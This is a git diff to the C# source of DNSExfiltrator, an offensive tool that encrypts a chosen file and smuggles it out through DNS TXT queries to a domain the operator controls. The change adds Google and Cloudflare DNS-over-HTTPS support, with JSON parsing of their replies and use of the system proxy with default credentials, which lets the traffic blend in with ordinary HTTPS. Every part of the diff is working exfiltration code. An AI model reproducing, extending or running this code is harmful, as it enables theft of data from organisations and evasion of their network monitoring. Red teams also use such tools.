@@ -11,6 +11,7 @@ As a DLL:
 */
 using System;
 using System.Net;
+using System.Web.Script.Serialization;
 using System.IO;
 using System.IO.Compression;
 using System.Text;
@@ -42,11 +43,11 @@ namespace DNSExfiltrator
 		private static void PrintUsage()
 		{
 			Console.WriteLine("Usage:");
-			Console.WriteLine("{0} <file> <domainName> <password> [-h] [s=DNS_server] [t=throttleTime] [r=requestMaxSize] [l=labelMaxSize]", System.AppDomain.CurrentDomain.FriendlyName);
+			Console.WriteLine("{0} <file> <domainName> <password> [h=google|cloudflare] [s=<DNS_server>] [t=<throttleTime>] [r=<requestMaxSize>] [l=<labelMaxSize>]", System.AppDomain.CurrentDomain.FriendlyName);
 			Console.WriteLine("\tfile:\t\t[MANDATORY] The file name to the file to be exfiltrated.");
 			Console.WriteLine("\tdomainName:\t[MANDATORY] The domain name to use for DNS requests.");
 			Console.WriteLine("\tpassword:\t[MANDATORY] Password used to encrypt the data to be exfiltrated.");
-			Console.WriteLine("\t-h:\t\t[OPTIONNAL] Flag enabling DoH (DNS over HTTP) usage. Uses Google's DoH servers.");
+			Console.WriteLine("\th:\t\t[OPTIONNAL] Use Google or CloudFlare DoH (DNS over HTTP) servers.");
 			Console.WriteLine("\tDNS_Server:\t[OPTIONNAL] The DNS server name or IP to use for DNS requests. Defaults to the system one.");
 			Console.WriteLine("\tthrottleTime:\t[OPTIONNAL] The time in milliseconds to wait between each DNS request.");
 			Console.WriteLine("\trequestMaxSize:\t[OPTIONNAL] The maximum size in bytes for each DNS request. Defaults to 255 bytes.");
@@ -113,6 +114,7 @@ namespace DNSExfiltrator
 
 			string fileName = String.Empty;
 			bool useDoH = false; // Whether or not to use DoH for resolution
+			string dohProvider = String.Empty; // Which DoH server to use: google or cloudflare
 			string dnsServer = null;
 			int throttleTime = 0;
 			string data = String.Empty;
@@ -161,9 +163,17 @@ namespace DNSExfiltrator
 						if (param < 63) { labelMaxSize = param; }
 						PrintColor(String.Format("[*] Setting label max size to [{0}] chars", labelMaxSize));
 					}
-					else if (args[i] == "-h") {
-						useDoH = true;
-						PrintColor("[*] Using DNS over HTTP for name resolution.");
+					else if (args[i].StartsWith("h=")) {
+						dohProvider = args[i].Split('=')[1];
+						if (dohProvider.Equals("google") || dohProvider.Equals("cloudflare")) {
+							useDoH = true;
+							PrintColor("[*] Using DNS over HTTP for name resolution.");
+						}
+						else {
+							PrintColor(String.Format("[!] Error with DoH parameter."));
+							PrintUsage();
+							return;
+						}
 					}
 					i++;
 				}
@@ -212,7 +222,7 @@ namespace DNSExfiltrator
 
 			string reply = String.Empty;
 			try {
-				if (useDoH) { reply = DOHResolver.GetTXTRecord(request); }
+				if (useDoH) { reply = DOHResolver.GetTXTRecord(dohProvider, request); }
 				else { reply = DnsResolver.GetTXTRecord(request,dnsServer); }
 				
 				if (reply != "OK") {
@@ -253,7 +263,7 @@ namespace DNSExfiltrator
 				
 				// Send the request
 				try {
-					if (useDoH) { reply = DOHResolver.GetTXTRecord(request); }
+					if (useDoH) { reply = DOHResolver.GetTXTRecord(dohProvider, request); }
 					else { reply = DnsResolver.GetTXTRecord(request,dnsServer); }
 					
 					countACK = Convert.ToInt32(reply);
@@ -332,18 +342,81 @@ namespace DNSExfiltrator
 	}	
 
 	//============================================================================================
+	// Define all classes required to deserialize CloudFlare or Google JSON response into an object
+	//============================================================================================
+	public class Question
+	{
+		public string name { get; set; }
+		public int type { get; set; }
+	}
+	public class Answer
+	{
+		public string name { get; set; }
+		public int type { get; set; }
+		public int TTL { get; set; }
+		public string data { get; set; }
+	}
+	public class Response
+	{
+		public int Status { get; set; }
+		public bool TC { get; set; }
+		public bool RD { get; set; }
+		public bool RA { get; set; }
+		public bool AD { get; set; }
+		public bool CD { get; set; }
+		public List<Question> Question { get; set; }
+		public List<Answer> Answer { get; set; }
+	}
+	
+	//============================================================================================
 	// This class provides DNS over HTTP resolution using the Google DOH experimental servers
 	//============================================================================================
     public class DOHResolver
     {
 		
-		static string googleDOHURI = "https://dns.google.com/experimental?ct&body=";
+		static string googleDOHURI = " https://dns.google.com/resolve?name="; // https://developers.google.com/speed/public-dns/docs/dns-over-https
+		static string cloudflareDOHURI = "https://cloudflare-dns.com/dns-query?ct=application/dns-json&name="; // https://developers.cloudflare.com/1.1.1.1/dns-over-https/wireformat/
 		
-		public static string GetTXTRecord(string domain)
+		public static string GetTXTRecord(string dohProvider, string domain)
 		{
+			string dohQuery = String.Empty;
+			
+			if (dohProvider.Equals("google")) {
+				dohQuery = googleDOHURI + domain + "&type=TXT";
+			}
+			else if (dohProvider.Equals("cloudflare")) {
+				dohQuery = cloudflareDOHURI + domain + "&type=TXT";
+			}
+
+			//------------------------------------------------------------------
+			// Perform the DOH request to the server
+			WebClient webClient = new WebClient(); // WebClient object to communicate with the DOH server
+			
+            //---- Check if an HTTP proxy is configured on the system, if so, use it
+            IWebProxy defaultProxy = WebRequest.DefaultWebProxy;
+            if (defaultProxy != null)
+            {
+                defaultProxy.Credentials = CredentialCache.DefaultCredentials;
+                webClient.Proxy = defaultProxy;
+            }
+			
+			string responsePacket = String.Empty;
+			responsePacket = webClient.DownloadString(dohQuery);
+			responsePacket = responsePacket.Replace("\\\"",""); // Replies with "data": "\"OK\"" causes JSON parsing to fail because of the uneeded escaped double-quote  
+			var responseObject = new JavaScriptSerializer().Deserialize<Response>(responsePacket);
+			
+			if (responseObject.Answer.Count >= 1) {
+					return responseObject.Answer[0].data;
+			}
+			else {
+				throw new Win32Exception("DNS answer does not contain a TXT resource record.");
+			}
+			
+			/*========================================== OLD CODE USING UDPWIRE FORMAT - Seems deprecated at Google, still available at CloudFlare ================================
 			List<byte> dnsPacket = new List<byte>();
 			List<byte> dnsQuery = new List<byte>();
-						
+			
+	
 			//---- Crafting the DNS packet, starting with the headers
 			// Transaction ID = 0x00002
 			// Flags: standard query = 0x0100
@@ -366,14 +439,20 @@ namespace DNSExfiltrator
 			//---- Concatenate the headers and the Query
 			dnsPacket.AddRange(dnsQuery);
 						
-			// Converting the dnsWirePacket to a base6url representation
+			// Converting the dnsWirePacket to a base64url representation
 			string dohParameter = Convert.ToBase64String(dnsPacket.ToArray()).Replace("=","").Replace("/","_").Replace("+","-");
-			string dohQuery = googleDOHURI + dohParameter;
+			
+			if (dohProvider.Equals("google")) {
+				dohQuery = googleDOHURI + dohParameter;
+			}
+			else if (dohProvider.Equals("cloudflare")) {
+				dohQuery = cloudflareDOHURI + dohParameter;
+			}
 			
 			//------------------------------------------------------------------
 			// Perform the DOH request to the server
 			WebClient webClient = new WebClient(); // WebClient object to communicate with the DOH server
-			byte[] responsePacket = null;
+			
 						
             //---- Check if an HTTP proxy is configured on the system, if so, use it
             IWebProxy defaultProxy = WebRequest.DefaultWebProxy;
@@ -384,16 +463,16 @@ namespace DNSExfiltrator
             }
 			
 			//---- Sending the DOH request and receiving the answer in a byte array
+			byte[] responsePacket = null;
 			responsePacket = webClient.DownloadData(dohQuery);
 			
-			/* DEBUG SECTION
-			Console.WriteLine("Response received:");
-			int i = 0;
-			foreach (byte b in responsePacket) {
-				Console.WriteLine("Packet[{0}]: {1} --> {2}",i++,Convert.ToInt32(b), Convert.ToChar(b));
-			}
-			*/
-						
+			// DEBUG SECTION
+			// Console.WriteLine("Response received:");
+			// int i = 0;
+			// foreach (byte b in responsePacket) {
+			// 	Console.WriteLine("Packet[{0}]: {1} --> {2}",i++,Convert.ToInt32(b), Convert.ToChar(b));
+			// }
+									
 			// DNS response structure is made of: [Headers] + [DNS Query] + [DNS Answer]
 			// Check we have at least one Answer Resource Records --> RR field
 			if (Convert.ToInt32(responsePacket[7]) > 0) {
@@ -415,6 +494,7 @@ namespace DNSExfiltrator
 			else {
 				throw new Win32Exception("DNS answer does not contain any resource record.");
 			}
+			*/
 		}
 	}
 	
